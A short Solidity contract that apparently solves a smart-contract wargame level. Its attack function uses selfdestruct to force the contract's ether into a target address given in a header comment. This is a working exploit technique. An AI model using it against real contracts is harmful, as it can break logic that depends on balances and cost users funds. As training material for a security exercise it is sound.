// Instance Address: 0x63E841F609Ff56C6189C6c9AaC6a6E92427041a8

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack2 {

    function attack(address _force) public {
        address payable addressForce = address(uint160(address(_force)));
        selfdestruct(addressForce);
    }

    receive() external payable {}
}